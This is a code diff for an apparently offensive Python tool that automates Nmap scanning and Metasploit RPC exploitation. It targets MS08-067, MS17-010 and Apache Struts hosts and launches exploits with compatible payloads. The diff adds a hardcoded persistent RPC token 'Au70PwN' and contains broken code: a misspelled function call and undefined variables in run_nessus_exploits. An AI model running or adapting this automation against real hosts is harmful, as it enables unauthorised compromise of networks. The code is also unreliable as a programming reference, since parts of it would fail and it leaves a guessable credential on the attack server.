@@ -9,7 +9,6 @@ import argparse
 import netifaces
 from IPython import embed
 from termcolor import colored
-from threading import Thread, Lock
 from libnmap.process import NmapProcess
 from libnessus.parser import NessusParser
 from netaddr import IPNetwork, AddrFormatError
@@ -40,19 +39,6 @@ def print_good(msg):
 
 def print_great(msg):
     print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
-
-def keep_alive(args, lock):
-    '''
-    msfrpc will kill auth tokens after 5m
-    '''
-    global CLIENT
-
-    last_check = time.time()
-    while True:
-        if time.time() - last_check > 100:
-            with lock:
-                CLIENT.login(args.username, args.password)
-        time.sleep(1)
 
 def run_proc(cmd):
     '''
@@ -134,7 +120,7 @@ def nmap_scan(hosts, add_args):
     Do Nmap scan
     '''
     #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
-    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'.format(add_args)
+    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA autopwn-scan'.format(add_args)
     print_info('Running: nmap {}'.format(nmap_args))
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
@@ -205,7 +191,7 @@ def check_named_pipes(c_id, ip, nmap_os):
     '''
     pipes = None
     path = 'auxiliary/scanner/smb/pipe_auditor'
-    rhost_var = 'RHOSTS'
+    rhost_var = get_rhost_var(c_id, path)
     port = '445'
     opts = ''
     payload = get_payload(path, nmap_os)
@@ -293,6 +279,28 @@ def run_console_cmd(c_id, cmd):
 
     return mod_output
 
+def get_req_opts(c_id, module):
+    req_opts = []
+    opts = CLIENT.call('module.options', [c_id, module])
+    print_info('Required options:')
+    for opt_name in opts:
+        if opts[opt_name]['required'] == True:
+            if 'default' not in opts[opt_name]:
+                req_opts.append(opt_name)
+                print('    {}'.format(opt_name))
+    return req_opts
+
+def get_rhost_var(c_id, module):
+    req_opts = get_req_opts(c_id, module)
+    for o in req_opts:
+        if 'RHOST' in o:
+            return o
+    print_bad('Could not get RHOST var')
+    print_bad('List of required options:')
+    for o in req_opts:
+        print_info(o)
+
+
 def get_payload(module, nmap_os):
     '''
     Automatically get compatible payloads
@@ -378,6 +386,8 @@ def check_vuln(c_id):
 def run_nessus_exploits(c_id, exploits):
     for mod in exploits:
         for ip,port in exploits[mod]:
+            req_opts = get_req_ops(c_id, mod)
+            rhost_var = get_rhost_var(c_id, mod)
             cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
             CLIENT.call('console.write', [c_id, cmd])
 
@@ -411,7 +421,7 @@ def run_if_vuln(c_id, cmd):
 def run_struts_dmi_rest_exec(c_id, host, port):
     path = 'exploit/multi/http/struts_dmi_rest_exec'
     ip = host.address
-    rhost_var = 'RHOST'
+    rhost_var = get_rhost_var(c_id, path)
     opts = ''
     nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
     payload = get_payload(path, nmap_os)
@@ -429,7 +439,7 @@ def run_ms08(c_id, host):
     ip = host.address
     nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
     port = '445'
-    rhost_var = 'RHOST'
+    rhost_var = get_rhost_var(c_id, path)
     opts = ''
     payload = get_payload(path, nmap_os)
     cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
@@ -445,7 +455,8 @@ def run_ms17(c_id, host):
     ip = host.address
     nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
     port = '445'
-    rhost_var = 'RHOST'
+    rhost_var = get_rhost_var(c_id, path)
+    opts = ''
 
     # Check for named pipe availability (preVista you could just grab em)
     # If we find one, then use Romance/Synergy instead of Blue
@@ -513,15 +524,9 @@ def wait_on_busy_console(c_id):
 def main(report, args):
     global CLIENT
 
-    lock = Lock()
-
-    # initialize keep alive process
-    # won't attempt first login until 100s from start
-    p = Thread(target=keep_alive, args=(args, lock))
-    p.setDaemon(True)
-    p.start()
-
     CLIENT.login(args.username, args.password)
+    CLIENT.call('auth.token_add', ['Au70PwN'])
+    CLIENT.token = 'Au70PwN'
 
     c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
 
